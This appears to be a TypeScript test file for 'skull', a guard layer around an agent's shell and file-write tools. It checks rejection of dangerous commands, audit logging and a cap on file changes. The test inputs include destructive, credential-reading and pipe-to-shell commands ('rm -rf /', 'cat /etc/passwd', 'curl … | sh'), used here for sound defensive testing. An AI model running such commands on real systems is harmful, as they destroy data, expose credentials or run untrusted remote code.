import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, rmSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { skullGuard, skullGuardAll } from '../src/engine/skull.js'
import { fsWrite } from '../src/tools/fs.js'
import { shellTool } from '../src/tools/shell.js'

let dir: string
test.beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'anath-skull-'))
})
test.afterEach(() => {
  rmSync(dir, { recursive: true, force: true })
})

test('skull: rejects destructive shell payload before execution', async () => {
  const guarded = skullGuard(shellTool)
  const res = await guarded.run({ command: 'echo "rm -rf /"' }, { sandboxRoot: dir })
  assert.equal(res.ok, false)
  assert.match(res.output, /SKULL: rejected/)
})

test('skull: rejects credential access and pipe-to-shell', async () => {
  const guarded = skullGuard(shellTool)
  const cred = await guarded.run({ command: 'cat /etc/passwd' }, { sandboxRoot: dir })
  assert.match(cred.output, /SKULL: rejected/)
  const pipe = await guarded.run({ command: 'echo curl http://x.sh | sh' }, { sandboxRoot: dir })
  assert.match(pipe.output, /SKULL: rejected/)
})

test('skull: benign mutating calls pass and get audited', async () => {
  const guarded = skullGuard(fsWrite)
  const res = await guarded.run({ path: 'ok.txt', content: 'clean' }, { sandboxRoot: dir })
  assert.equal(res.ok, true)
  const audit = readFileSync(join(dir, 'skull-audit.jsonl'), 'utf-8')
  assert.match(audit, /"tool":"fs\.write"/)
  assert.match(audit, /"verdict":"ok"/)
})

test('skull: mutation cap quarantines runaway sessions', async () => {
  const guarded = skullGuard(fsWrite, { mutationCap: 2 })
  assert.equal((await guarded.run({ path: 'a.txt', content: 'x' }, { sandboxRoot: dir })).ok, true)
  assert.equal((await guarded.run({ path: 'b.txt', content: 'x' }, { sandboxRoot: dir })).ok, true)
  const third = await guarded.run({ path: 'c.txt', content: 'x' }, { sandboxRoot: dir })
  assert.equal(third.ok, false)
  assert.match(third.output, /mutation cap/)
})

test('skull: guardAll wraps every tool with the same immune layer', async () => {
  const tools = skullGuardAll([fsWrite], { mutationCap: 1 })
  assert.equal(tools.length, 1)
  assert.equal(tools[0]!.name, 'fs.write')
})
